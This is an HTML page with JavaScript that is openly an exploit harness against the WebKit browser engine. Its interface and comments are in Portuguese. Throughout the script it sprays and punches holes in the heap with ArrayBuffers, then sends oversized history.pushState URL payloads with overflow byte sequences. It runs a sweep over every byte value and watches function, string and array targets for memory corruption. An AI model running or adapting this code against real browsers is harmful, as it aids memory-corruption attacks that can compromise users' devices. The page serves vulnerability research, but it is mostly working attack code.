<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WebKit 6-3-1 + Advanced Detection</title>
</head>
<body>

<h1>WebKit Exploitation - Sequência 6-3-1 Original</h1>

<h2>ESTRATÉGIA</h2>
<p><strong>Teste 6:</strong> Exploração Incremental (prepara quota)</p>
<p><strong>Teste 3:</strong> Sequências Especiais (mais pressão)</p>
<p><strong>Teste 1 Modificado:</strong> Detecção avançada de corrupção</p>

<hr>

<h2>Executar Sequência Completa 6→3→1</h2>
<p>Executa os 3 testes em sequência automaticamente</p>
<button onclick="executeFullSequence()">▶ EXECUTAR SEQUÊNCIA 6-3-1</button>

<hr>

<h2>Testes Individuais (para debug)</h2>
<button onclick="test6_Incremental()">Teste 6: Incremental</button>
<button onclick="test3_SpecialSequences()">Teste 3: Sequências</button>
<button onclick="test1_AdvancedDetection()">Teste 1: Detecção Avançada</button>

<hr>

<h2>Configurações (Teste 6)</h2>
<label>Start:</label>
<input type="number" id="t6start" value="1000" min="100" max="50000">
<label>Step:</label>
<input type="number" id="t6step" value="5000" min="100" max="10000">

<hr>

<button onclick="clearLog()">Limpar Log</button>

<hr>

<div id="log"></div>

<script>
// ===================================================================
// CONSTANTES
// ===================================================================
const BASE_SAFE = 709522;

// Objetos de controle
let heapObjects = [];
let targetObjects = [];

// Alvos avançados (adicionados para detecção)
let functionTargets = [];
let stringTargets = [];
let arrayTargets = [];

// ===================================================================
// LOGGING
// ===================================================================
function log(msg) {
    const el = document.getElementById('log');
    const time = new Date().toLocaleTimeString();
    el.innerHTML += `<div>[${time}] ${msg}</div>`;
    el.scrollTop = el.scrollHeight;
}

function clearLog() {
    document.getElementById('log').innerHTML = '';
    log('Log limpo');
}

// ===================================================================
// PREPARAÇÃO DE HEAP (ORIGINAL)
// ===================================================================
function prepareHeap() {
    log('Preparando heap...');
    
    heapObjects = [];
    targetObjects = [];
    
    // Spray
    for (let i = 0; i < 500; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0x41414141);
        heapObjects.push({buf, view});
    }
    
    // Holes
    for (let i = 0; i < heapObjects.length; i += 3) {
        heapObjects[i] = null;
    }
    
    // Alvos
    for (let i = 0; i < 50; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0xDEADBEEF);
        targetObjects.push({
            id: i,
            magic: 0xCAFEBABE,
            buf: buf,
            view: view
        });
    }
    
    log('Heap preparado: 500 spray + 50 alvos');
}

// ===================================================================
// PREPARAÇÃO AVANÇADA (ADICIONAL)
// ===================================================================
function prepareAdvancedTargets() {
    log('Criando alvos avançados...');
    
    // Funções (mostraram corrupção no teste 9!)
    functionTargets = [];
    for (let i = 0; i < 50; i++) {
        const expectedReturn = 0x90000000 + i;
        const func = new Function('', `return 0x${expectedReturn.toString(16)};`);
        functionTargets.push({
            id: i,
            func: func,
            expected: expectedReturn
        });
    }
    
    // Strings
    stringTargets = [];
    for (let i = 0; i < 50; i++) {
        const str = "TARGET_STRING_" + i.toString().padStart(4, '0') + "_" + "X".repeat(100);
        stringTargets.push({
            id: i,
            original: str,
            current: str
        });
    }
    
    // Arrays
    arrayTargets = [];
    for (let i = 0; i < 50; i++) {
        const arr = new Array(100);
        for (let j = 0; j < 100; j++) {
            arr[j] = 0x50000000 + i * 1000 + j;
        }
        arrayTargets.push({
            id: i,
            array: arr,
            originalLength: arr.length
        });
    }
    
    log(`  ${functionTargets.length} funções`);
    log(`  ${stringTargets.length} strings`);
    log(`  ${arrayTargets.length} arrays`);
}

// ===================================================================
// VERIFICAÇÃO BÁSICA (ORIGINAL)
// ===================================================================
function checkCorruption() {
    let corrupted = 0;
    for (let i = 0; i < Math.min(10, targetObjects.length); i++) {
        try {
            const t = targetObjects[i];
            if (t.magic !== 0xCAFEBABE) {
                log(`CORRUPTED alvo ${i}: magic=0x${t.magic.toString(16)}`);
                corrupted++;
            }
            if (t.view[0] !== 0xDEADBEEF) {
                log(`CORRUPTED alvo ${i}: buffer=0x${t.view[0].toString(16)}`);
                corrupted++;
            }
        } catch (e) {
            log(`DESTROYED alvo ${i}`);
            corrupted++;
        }
    }
    return corrupted;
}

// ===================================================================
// VERIFICAÇÃO AVANÇADA (ADICIONAL)
// ===================================================================
function checkAdvancedCorruption() {
    let total = 0;
    let details = [];
    
    // Check funções
    let funcCorrupted = 0;
    for (let i = 0; i < Math.min(20, functionTargets.length); i++) {
        const t = functionTargets[i];
        try {
            const result = t.func();
            if (isNaN(result)) {
                funcCorrupted++;
                details.push(`Function ${i}: NaN (esperado 0x${t.expected.toString(16)})`);
            } else if (result !== t.expected) {
                funcCorrupted++;
                details.push(`Function ${i}: 0x${result.toString(16)} != 0x${t.expected.toString(16)}`);
            }
        } catch (e) {
            funcCorrupted++;
            details.push(`Function ${i}: CRASH`);
        }
    }
    
    // Check strings
    let strCorrupted = 0;
    for (let i = 0; i < Math.min(20, stringTargets.length); i++) {
        const t = stringTargets[i];
        if (t.current.length !== t.original.length) {
            strCorrupted++;
            details.push(`String ${i}: length ${t.current.length} != ${t.original.length}`);
        } else if (t.current !== t.original) {
            strCorrupted++;
            details.push(`String ${i}: conteúdo alterado`);
        }
    }
    
    // Check arrays
    let arrCorrupted = 0;
    for (let i = 0; i < Math.min(20, arrayTargets.length); i++) {
        const t = arrayTargets[i];
        try {
            if (t.array.length !== t.originalLength) {
                arrCorrupted++;
                details.push(`Array ${i}: length ${t.array.length} != ${t.originalLength}`);
            }
            const expected = 0x50000000 + i * 1000;
            if (t.array[0] !== expected) {
                arrCorrupted++;
                details.push(`Array ${i}[0]: 0x${t.array[0].toString(16)} != 0x${expected.toString(16)}`);
            }
        } catch (e) {
            arrCorrupted++;
            details.push(`Array ${i}: ERROR`);
        }
    }
    
    total = funcCorrupted + strCorrupted + arrCorrupted;
    
    return {
        total: total,
        functions: funcCorrupted,
        strings: strCorrupted,
        arrays: arrCorrupted,
        details: details
    };
}

// ===================================================================
// TESTE 6: EXPLORAÇÃO INCREMENTAL (100% ORIGINAL)
// ===================================================================
async function test6_Incremental() {
    log('================================');
    log('TESTE 6: EXPLORAÇÃO INCREMENTAL');
    log('================================');
    
    prepareHeap();
    
    const start = parseInt(document.getElementById('t6start').value);
    const step = parseInt(document.getElementById('t6step').value);
    
    log(`Começando em ${start} bytes, incremento de ${step}`);
    
    let currentSize = start;
    let maxSuccess = 0;
    
    for (let i = 0; i < 10; i++) {
        log('');
        log(`Tentativa ${i+1}: ${currentSize} bytes`);
        
        try {
            const base = "A".repeat(BASE_SAFE);
            
            // Overflow usando apenas bytes válidos
            let overflow = "";
            for (let j = 0; j < currentSize; j++) {
                overflow += String.fromCharCode(j % 33);
            }
            
            const payload = "/" + base + overflow;
            
            history.pushState({}, `inc_${currentSize}`, payload);
            
            log(`SUCESSO com ${currentSize} bytes`);
            maxSuccess = currentSize;
            
            currentSize += step;
            
            await new Promise(r => setTimeout(r, 1500));
            
        } catch (e) {
            log(`CRASH em ${currentSize} bytes: ${e.message}`);
            break;
        }
    }
    
    log('');
    log('=== RESULTADO ===');
    log(`Tamanho máximo sem crash: ${maxSuccess} bytes`);
    
    setTimeout(() => {
        const corrupted = checkCorruption();
        if (corrupted > 0) {
            log(`EXPLORAÇÃO SUCESSO! ${corrupted} alvos corrompidos`);
        }
    }, 1000);
}

// ===================================================================
// TESTE 3: SEQUÊNCIAS ESPECIAIS (100% ORIGINAL)
// ===================================================================
function test3_SpecialSequences() {
    log('================================');
    log('TESTE 3: SEQUÊNCIAS ESPECIAIS');
    log('================================');
    
    prepareHeap();
    
    // Sequências com significado especial
    const sequences = [
        { name: "Null-terminated", bytes: [0x00, 0x00, 0x00, 0x00] },
        { name: "Newlines", bytes: [0x0A, 0x0A, 0x0A, 0x0A] },
        { name: "Tabs", bytes: [0x09, 0x09, 0x09, 0x09] },
        { name: "Carriage Return", bytes: [0x0D, 0x0D, 0x0D, 0x0D] },
        { name: "Space", bytes: [0x20, 0x20, 0x20, 0x20] },
        { name: "Mixed Control", bytes: [0x00, 0x09, 0x0A, 0x0D, 0x20] },
        { name: "ASCII Control", bytes: [0x01, 0x02, 0x03, 0x04, 0x05] },
        { name: "Bell/Backspace", bytes: [0x07, 0x08, 0x08, 0x07] }
    ];
    
    for (let seq of sequences) {
        log('');
        log(`Testando: ${seq.name}`);
        log(`Bytes: [${seq.bytes.map(b => '0x'+b.toString(16).padStart(2,'0')).join(', ')}]`);
        
        try {
            const base = "A".repeat(BASE_SAFE);
            
            // Repetir sequência 1000 vezes
            let overflow = "";
            for (let i = 0; i < 1000; i++) {
                for (let byte of seq.bytes) {
                    overflow += String.fromCharCode(byte);
                }
            }
            
            const payload = "/" + base + overflow;
            
            history.pushState({}, seq.name.replace(/\s/g, '_'), payload);
            
            log(`SUCESSO: ${seq.name} executado`);
            
        } catch (e) {
            log(`CRASH: ${seq.name} - ${e.message}`);
        }
    }
    
    setTimeout(() => {
        log('');
        log('Verificando corrupção...');
        const corrupted = checkCorruption();
        if (corrupted > 0) {
            log(`RESULTADO: ${corrupted} alvos corrompidos por sequências especiais`);
        }
    }, 2000);
}

// ===================================================================
// TESTE 1 MODIFICADO: DETECÇÃO AVANÇADA
// ===================================================================
function test1_AdvancedDetection() {
    log('================================');
    log('TESTE 1: DETECÇÃO AVANÇADA');
    log('================================');
    
    // Criar heap básico
    prepareHeap();
    
    // Criar alvos avançados
    prepareAdvancedTargets();
    
    log('');
    log('Testando cada byte de 0x00 a 0xFF...');
    
    const allowedBytes = [];
    const crashBytes = [];
    
    for (let byte = 0x00; byte <= 0xFF; byte++) {
        try {
            const base = "A".repeat(BASE_SAFE);
            const testByte = String.fromCharCode(byte);
            const overflow = testByte.repeat(100);
            const payload = "/" + base + overflow;
            
            history.pushState({}, `test_${byte}`, payload);
            
            allowedBytes.push(byte);
            
            if (byte % 16 === 0) {
                log(`Testando 0x${byte.toString(16).padStart(2, '0')}... OK`);
            }
            
        } catch (e) {
            crashBytes.push(byte);
            log(`CRASH em 0x${byte.toString(16).padStart(2, '0')}: ${e.message}`);
        }
    }
    
    log('');
    log('=== RESULTADO DO MAPEAMENTO ===');
    log(`Bytes permitidos: ${allowedBytes.length}`);
    log(`Range: 0x${Math.min(...allowedBytes).toString(16)} - 0x${Math.max(...allowedBytes).toString(16)}`);
    log(`Lista: [${allowedBytes.map(b => '0x'+b.toString(16).padStart(2,'0')).join(', ')}]`);
    log('');
    log(`Bytes que crasham: ${crashBytes.length}`);
    if (crashBytes.length < 50) {
        log(`Lista: [${crashBytes.map(b => '0x'+b.toString(16).padStart(2,'0')).join(', ')}]`);
    }
    
    // AQUI ENTRA A PARTE NOVA: DETECÇÃO AVANÇADA
    log('');
    log('=== VERIFICAÇÃO AVANÇADA DE CORRUPÇÃO ===');
    
    setTimeout(() => {
        // Verificação básica
        const basicCorrupted = checkCorruption();
        log(`Corrupção básica (buffers): ${basicCorrupted}`);
        
        // Verificação avançada
        log('');
        log('Verificando alvos avançados...');
        const advanced = checkAdvancedCorruption();
        
        log('');
        log(`Total de corrupções: ${advanced.total}`);
        log(`  Funções: ${advanced.functions}/${functionTargets.length}`);
        log(`  Strings: ${advanced.strings}/${stringTargets.length}`);
        log(`  Arrays: ${advanced.arrays}/${arrayTargets.length}`);
        
        if (advanced.total > 0) {
            log('');
            log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
            log('CORRUPÇÃO DETECTADA!');
            log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
            log('');
            log('Detalhes (primeiros 15):');
            for (let detail of advanced.details.slice(0, 15)) {
                log(`  ${detail}`);
            }
        } else {
            log('');
            log('Nenhuma corrupção detectada nos alvos avançados');
        }
        
        // Detectar comportamento anômalo (bytes extras)
        if (allowedBytes.length !== 33 && allowedBytes.length > 0) {
            log('');
            log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
            log('COMPORTAMENTO ANÔMALO DETECTADO!');
            log(`Esperado: 33 bytes (0x00-0x20)`);
            log(`Obtido: ${allowedBytes.length} bytes`);
            log('RACE CONDITION / QUOTA INSTÁVEL!');
            log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
        }
        
    }, 2000);
}

// ===================================================================
// SEQUÊNCIA COMPLETA 6-3-1
// ===================================================================
async function executeFullSequence() {
    log('═══════════════════════════════════════');
    log('EXECUTANDO SEQUÊNCIA COMPLETA 6-3-1');
    log('═══════════════════════════════════════');
    
    clearLog();
    
    log('Esta sequência executa:');
    log('1. Teste 6 (Incremental) - prepara quota');
    log('2. Teste 3 (Sequências) - mais pressão');
    log('3. Teste 1 (Detecção Avançada) - mapeia + detecta corrupção');
    log('');
    log('Aguarde aproximadamente 2 minutos...');
    log('');
    
    // Criar TODOS os alvos no início
    prepareHeap();
    prepareAdvancedTargets();
    
    await new Promise(r => setTimeout(r, 1000));
    
    // TESTE 6
    log('═══ INICIANDO TESTE 6 ═══');
    await test6_Incremental();
    
    await new Promise(r => setTimeout(r, 3000));
    
    // TESTE 3
    log('');
    log('═══ INICIANDO TESTE 3 ═══');
    test3_SpecialSequences();
    
    await new Promise(r => setTimeout(r, 5000));
    
    // TESTE 1
    log('');
    log('═══ INICIANDO TESTE 1 (DETECÇÃO AVANÇADA) ═══');
    test1_AdvancedDetection();
}

// ===================================================================
// INICIALIZAÇÃO
// ===================================================================
log('WebKit Exploitation - Sequência 6-3-1 Original');
log('');
log('IMPORTANTE: Este código mantém 100% de fidelidade aos testes originais');
log('Teste 6 e 3 são IDÊNTICOS ao original');
log('Teste 1 mantém mapeamento original + adiciona detecção avançada');
log('');
log('Clique em "EXECUTAR SEQUÊNCIA 6-3-1" para iniciar');
</script>

</body>
</html>
